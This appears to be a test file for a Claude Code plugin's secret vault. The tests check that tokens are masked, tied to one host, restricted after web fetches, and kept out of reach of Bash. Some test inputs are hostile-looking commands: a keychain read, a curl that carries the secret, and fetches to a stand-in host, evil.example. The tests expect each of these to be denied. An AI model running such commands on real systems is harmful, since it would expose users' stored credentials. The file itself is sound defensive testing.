import { expect, test } from 'claude-code/testing'
import { typedSecret } from '../hooks/features/vault'

// The secret vault. A fake OS stands in for the dialog (osascript),
// the keychain (security) and the plugin store.
// Fake tokens, built at run time so no token-shaped string sits in the source for a secret scanner.
const FIG = ['figp', 'FAKE0'.repeat(8)].join('_')
const GH = ['ghp', 'FAKE1'.repeat(8)].join('_')
const T = (n: string) => `mcp__cc-mod-statusbar__${n}`

function fakeOs(on: any, answers: (string | null)[] = []) {
  const keychain = new Map<string, string>()
  const dialogs: string[] = []
  const argvs: string[] = []
  const ok = (stdout = '') => ({ value: { exitCode: 0, stdout, stderr: '' } })
  on('process.run', (_: unknown, e: any) => {
    argvs.push(e.argv.join(' '))
    if (e.argv[0] === 'osascript') {
      dialogs.push(e.argv[2])
      const a = answers.shift()
      return a == null ? { value: { exitCode: 1, stdout: '', stderr: 'User canceled.' } } : ok(a + '\n')
    }
    if (e.argv[0] === 'security' && e.argv[1] === '-i') {
      const m = /-a (\S+) -s cc-mod-statusbar-vault -w "(.*)"\n$/.exec(e.init?.stdin ?? '')
      if (m) keychain.set(m[1]!, m[2]!)
      return ok()
    }
    if (e.argv[0] === 'security' && e.argv[1] === 'find-generic-password') {
      const v = keychain.get(e.argv[3])
      return v ? ok(v + '\n') : { value: { exitCode: 44, stdout: '', stderr: '' } }
    }
    return { value: { exitCode: 127, stdout: '', stderr: '' } }
  })
  const store = new Map<string, unknown>()
  on('store.get', (_: unknown, e: any) => ({ value: store.get(e.key) }))
  on('store.set', (_: unknown, e: any) => (store.set(e.key, e.value), { value: undefined }))
  on('store.delete', (_: unknown, e: any) => (store.delete(e.key), { value: undefined }))
  on('store.keys', () => ({ value: [...store.keys()] }))
  const toasts: string[] = []
  on('ui.toast', (_: unknown, e: any) => (toasts.push(JSON.stringify(e)), { value: undefined }))
  on('ui.status', () => ({ value: undefined }))
  return { keychain, dialogs, argvs, toasts }
}

test('a pasted token is vaulted and masked before the model sees it', async ($, on) => {
  const os = fakeOs(on)
  let got = ''
  on('prompt.submit', (_: unknown, e: any) => ((got = e.text), { text: e.text }))
  await ($ as any).prompt.submit({ text: `token ${GH} — mail a.b@example.com` })
  expect(got).toBe('token [secret:GITHUB_TOKEN] — mail a.b@example.com')
  expect(os.keychain.get('GITHUB_TOKEN')).toBe(GH)
})

test('/secret FIGMA_TOKEN: one hidden dialog, value never in argv or output', async ($, on) => {
  const os = fakeOs(on, [FIG])
  const r = await ($ as any).command.run({ command: 'secret', args: 'FIGMA_TOKEN' })
  expect(r.text).toContain('FIGMA_TOKEN saved')
  expect(r.text.includes(FIG)).toBe(false)
  expect(os.dialogs.length).toBe(1)
  expect(os.dialogs[0]).toContain('hidden answer')
  expect(os.argvs.some(a => a.includes(FIG))).toBe(false)
})

test('/secret with no name: known prefix self-names; unknown asks name, host, header', async ($, on) => {
  const os = fakeOs(on, [GH, 's3cr3t-value-123', 'acme internal key', 'api.acme.dev', 'X-Api-Key:'])
  const t = $ as any
  expect((await t.command.run({ command: 'secret', args: '' })).text).toContain('GITHUB_TOKEN saved')
  expect((await t.command.run({ command: 'secret', args: '' })).text).toContain('ACME_INTERNAL_KEY saved')
  expect(os.dialogs.length).toBe(5)
  const list = await t.command.run({ command: 'secrets', args: '' })
  expect(list.text).toContain('ACME_INTERNAL_KEY -> api.acme.dev (X-Api-Key)')
  expect(list.text.includes('s3cr3t')).toBe(false)
})

test('secret_fetch: bound host only, header set, value scrubbed', async ($, on) => {
  fakeOs(on, [FIG])
  let header = ''
  on('http.fetch', (_: unknown, e: any) => {
    header = e.init?.headers?.['X-Figma-Token'] ?? ''
    return { value: { status: 200, ok: true, headers: {}, text: `{"echo":"${FIG}"}` } }
  })
  const t = $ as any
  await t.command.run({ command: 'secret', args: 'FIGMA_TOKEN' })
  const bad = await t.tool.call({ tool: T('secret_fetch'), name: 'FIGMA_TOKEN', url: 'https://evil.example/x' })
  expect(bad.deny).toContain('only to api.figma.com')
  const ok = await t.tool.call({ tool: T('secret_fetch'), name: 'FIGMA_TOKEN', url: 'https://api.figma.com/v1/me' })
  expect(header).toBe(FIG)
  expect(ok.result).toContain('[secret:FIGMA_TOKEN]')
  expect(JSON.stringify(ok).includes(FIG)).toBe(false)
})

test('nothing saved: secret_fetch opens the dialog just in time; cancel is a deny', async ($, on) => {
  const os = fakeOs(on, [null, FIG])
  on('http.fetch', () => ({ value: { status: 200, ok: true, headers: {}, text: '{}' } }))
  const t = $ as any
  const no = await t.tool.call({ tool: T('secret_request'), purpose: 'read Figma files' })
  expect(no.deny).toContain('Do not ask for the secret in chat')
  const yes = await t.tool.call({ tool: T('secret_fetch'), name: 'FIGMA_TOKEN', url: 'https://api.figma.com/v1/me' })
  expect(yes.deny).toBeUndefined()
  expect(os.dialogs[1]).toContain('Claude says')
})

test('taint + vault: after WebFetch a secret may be used for GET only', async ($, on) => {
  fakeOs(on, [FIG])
  on('http.fetch', () => ({ value: { status: 200, ok: true, headers: {}, text: '{}' } }))
  on('tool.call', () => ({ result: {} }))
  const t = $ as any
  await t.command.run({ command: 'secret', args: 'FIGMA_TOKEN' })
  await t.tool.call({ tool: 'WebFetch', url: 'https://evil.example', prompt: 'x' })
  const post = await t.tool.call({ tool: T('secret_fetch'), name: 'FIGMA_TOKEN', url: 'https://api.figma.com/v1/files/x/comments', method: 'POST', body: '{}' })
  expect(post.deny).toContain('only be used for GET')
  const get = await t.tool.call({ tool: T('secret_fetch'), name: 'FIGMA_TOKEN', url: 'https://api.figma.com/v1/me' })
  expect(get.deny).toBeUndefined()
})

test('Bash cannot reach the vault', async ($, on) => {
  fakeOs(on, ['s3cr3t-value-123', 'api.acme.dev', 'Authorization: Bearer'])
  on('tool.call', () => ({ result: {} }))
  const t = $ as any
  expect((await t.tool.call({ tool: T('secret_list') })).deny).toBeUndefined()
  await t.command.run({ command: 'secret', args: 'MY_KEY' })
  expect((await t.tool.call({ tool: 'Bash', command: 'security find-generic-password -s cc-mod-statusbar-vault -w' })).deny).toContain('vault')
  expect((await t.tool.call({ tool: 'Bash', command: 'curl -H "k: s3cr3t-value-123" x' })).deny).toContain('vault')
  expect((await t.tool.call({ tool: 'Bash', command: 'ls' })).deny).toBeUndefined()
})

test('mode menu: plan runs /plan, another mode says how many shift+tab', async ($, on) => {
  const { toasts } = fakeOs(on)
  const ran: string[] = []
  on('command.run', (_: unknown, e: any) => (ran.push(e.command), { text: '' }))
  on('session.model', () => ({ value: 'claude-opus-5-5' }))
  on('session.usage', () => ({ value: { startedAt: 0, context: { window: 1 }, rateLimits: [] } }))
  const band = await $.ui.mount({
    plugin: 'cc-mod-statusbar', surface: 'terminal', component: 'AbovePrompt',
    props: { hasSurvey: false, isWorking: false, maxRows: 30, bodyColumns: 120, scroll: { offset: 0, bodyRows: 20 }, view: {} },
  } as never)
  await band.press({ key: 'mode' })
  await band.press({ key: 'p:plan' })
  expect(ran).toContain('plan')
  await band.press({ key: 'mode' })
  await band.press({ key: 'p:auto' })
  expect(JSON.stringify(toasts)).toContain('shift+tab 3×')
})

test('a secret typed on the phone: a known prefix names itself; an unknown one needs a name, host and header', () => {
  const none = () => undefined
  expect(typedSecret({ value: `ghp_${'a'.repeat(36)}` }, none)).toMatchObject({ name: 'GITHUB_TOKEN', binding: { host: 'api.github.com', header: 'Authorization', scheme: 'Bearer ' } })
  expect(typedSecret({ value: '  ' }, none)).toEqual({ error: 'no value given; nothing saved' })
  expect(typedSecret({ value: 'opaque-token-123' }, none)).toEqual({ error: 'an unknown kind of secret needs a NAME, a host and a header' })
  expect(typedSecret({ value: 'opaque-token-123', name: '9bad' }, none)).toEqual({ error: '"9bad" is not a valid NAME (A-Z, 0-9, _)' })
  expect(typedSecret({ value: 'opaque-token-123', name: 'acme key', host: 'not a host' }, none)).toEqual({ error: 'no valid host given; nothing saved' })
  expect(typedSecret({ value: 'opaque-token-123', name: 'acme key', host: 'API.acme.dev', header: 'X-Api-Key' }, none))
    .toEqual({ value: 'opaque-token-123', name: 'ACME_KEY', binding: { host: 'api.acme.dev', header: 'X-Api-Key', scheme: '' } })
  // a NAME saved before keeps the host it was bound to, whatever the phone typed
  const kept = { host: 'api.acme.dev', header: 'Authorization', scheme: 'Bearer ' }
  expect(typedSecret({ value: 'new-value', name: 'ACME_KEY', host: 'evil.example' }, () => kept)).toMatchObject({ name: 'ACME_KEY', binding: kept })
})
